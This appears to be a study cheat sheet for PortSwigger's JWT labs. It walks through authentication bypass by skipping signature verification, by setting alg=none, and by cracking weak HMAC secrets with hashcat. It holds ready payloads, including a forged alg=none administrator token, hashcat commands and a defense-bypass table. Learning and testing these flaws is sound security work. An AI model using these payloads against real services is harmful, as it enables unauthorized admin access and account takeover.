# JWT attacks - Signature bypass (no verification, alg=none, weak secret)

If the server doesn't verify the JWT signature at all, any edited payload is accepted. If it accepts alg=none, removing the signature entirely bypasses auth. If HMAC is used with a weak/default secret, hashcat recovers it in seconds - then forge valid tokens at will.

## Quick reference
```
# 1. No verification - edit sub in Burp Inspector, send as-is (signature unchanged but invalid)
GET /admin
Cookie: session=<JWT with sub="administrator", original sig>

# 2. alg=none bypass
# Header (base64url): {"alg":"none"}  -> eyJhbGciOiJub25lIn0
# Payload (base64url): {"sub":"administrator",...}
# Signature: <empty>  - keep the trailing dot!
Cookie: session=eyJhbGciOiJub25lIn0.<new-b64-payload>.

# 3. Brute-force HMAC secret
hashcat -a 0 -m 16500 <full-JWT> /usr/share/wordlists/jwt.secrets.list
# -> secret1
# Burp JWT Editor: New Symmetric Key -> k = base64url("secret1")
# Edit payload sub=administrator -> Sign -> send
```

## Root cause
- Library configured with `verify=False` or equivalent - signature check skipped entirely.
- `alg=none` accepted by libraries that trust the algorithm field from the token itself.
- Short, default, or common HMAC secrets (secret, secret1, password) with no rotation - recoverable with dictionary attack.

## Find it
1. Log in -> grab JWT session cookie.
2. Decode in Burp Inspector -> change sub claim (wiener->administrator) -> send unchanged.
   - 200 on /admin = no verification.
3. Set alg=none in header, strip signature (leave trailing dot) -> send.
   - 200 = alg=none accepted.
4. Identify alg (HS256/HS512) -> run hashcat: `-a 0 -m 16500 <JWT> wordlist`.
   - Cracked = forge tokens with any payload.

## Technique

**No verification (Lab 1):**
1. Log in -> proxy -> GET /my-account has JWT session cookie.
2. Burp Repeater: GET /admin (403 - needs administrator).
3. Inspector -> select JWT payload -> change sub from "wiener" to "administrator" -> Apply changes.
4. Send -> 200 -> find `/admin/delete?username=carlos` in response -> send -> solved.

**alg=none (Lab 2):**
1. Same setup - GET /admin needs administrator.
2. Inspector -> JWT header -> change alg from "RS256" to "none" -> Apply.
3. JWT payload -> change sub to "administrator" -> Apply.
4. In the raw cookie, delete the signature (third segment after the last dot), but keep the trailing dot: `header.payload.`
5. Send -> 200 -> delete carlos.

**Weak HMAC secret (Lab 3):**
1. Identify HS256 in header.
2. Copy full JWT.
3. `hashcat -a 0 -m 16500 <JWT> /path/to/jwt.secrets.list` -> output: `<JWT>:secret1`
4. Burp JWT Editor -> New Symmetric Key -> Generate -> replace k with `base64url("secret1")` = `c2VjcmV0MQ`
5. GET /admin tab -> JWT Editor tab -> payload: sub="administrator" -> Sign (Don't modify header) -> Send.
6. 200 -> delete carlos.

## Payload arsenal
```
# alg=none header (raw JSON -> base64url)
{"alg":"none"}  ->  eyJhbGciOiJub25lIn0

# Modified payload example
{"iss":"portswigger","sub":"administrator","exp":9999999999}

# Full alg=none token
eyJhbGciOiJub25lIn0.eyJpc3MiOiJwb3J0c3dpZ2dlciIsInN1YiI6ImFkbWluaXN0cmF0b3IiLCJleHAiOjk5OTk5OTk5OTl9.

# hashcat command
hashcat -a 0 -m 16500 eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ3aWVuZXIiLCJleHAiOjE2MDAwMDAwMDB9.SIG /usr/share/wordlists/jwt.secrets.list

# JWT Editor symmetric key JSON (k = base64url of secret)
{"kty":"oct","k":"c2VjcmV0MQ"}
```

## Bypasses
| Defense | Bypass |
|---|---|
| Signature present | No-verification: server doesn't check - any sig accepted |
| RS256 enforced | Try alg=none in header - older libraries may accept |
| HS256 with complex secret | Increase hashcat rules: `-r best64.rule`; try rockyou + jwt wordlist |

## Exploitation walkthrough
**No-verify:** Decode JWT -> change sub to administrator -> send original token with modified payload -> /admin accessible -> delete carlos.

**alg=none:** Change alg="none" -> change sub=administrator -> strip signature segment (keep trailing dot) -> send -> /admin accessible.

**Weak secret:** hashcat cracks HS256 JWT -> secret1 -> create symmetric key -> re-sign with sub=administrator -> /admin -> delete carlos.

## Chaining
- Admin access -> [Access-control](../../Access-control/) (delete users, IDOR, BFLA)
- Forged JWT -> bypass [Authentication](../../Authentication/) checks
- Combined with SSRF if token used for service-to-service auth

## Tools
- **Burp JWT Editor** - Inspector-based payload editing + signing
- **hashcat -m 16500** - HS256/HS384/HS512 JWT cracking (mode 16500)
- **jwt.io** - manual decode/verify

## Labs

### JWT authentication bypass via unverified signature [Apprentice]
Change sub claim from "wiener" to "administrator" in Burp Inspector - no re-signing needed. Server accepts any payload without verifying the signature. Key insight: the signature is present but never checked.

### JWT authentication bypass via flawed signature verification [Apprentice]
Set alg="none" in header, sub="administrator" in payload, delete signature segment (keep trailing dot). Server's library trusts the alg field and skips HMAC/RSA check when alg=none. Key insight: never let the token dictate its own verification algorithm.

### JWT authentication bypass via weak signing key [Practitioner]
`hashcat -a 0 -m 16500 <JWT> jwt.secrets.list` -> cracks to "secret1". Base64url-encode secret -> create symmetric key in JWT Editor -> re-sign with sub=administrator -> admin access. Key insight: default/short secrets are in wordlists; HS256 with a guessable key is equivalent to no signature.

## Real-world notes
- JWT libraries with `verify=False` exist in production - always check the flag in code review.
- alg=none is a legacy spec feature; still present in some Java/Python implementations.
- Common default secrets: secret, password, key, 1234, jwt, token, changeme, your-256-bit-secret.
- HS512 has same brute-force attack as HS256; just use hashcat mode 16500 (auto-detects length).

## References
- https://portswigger.net/web-security/jwt
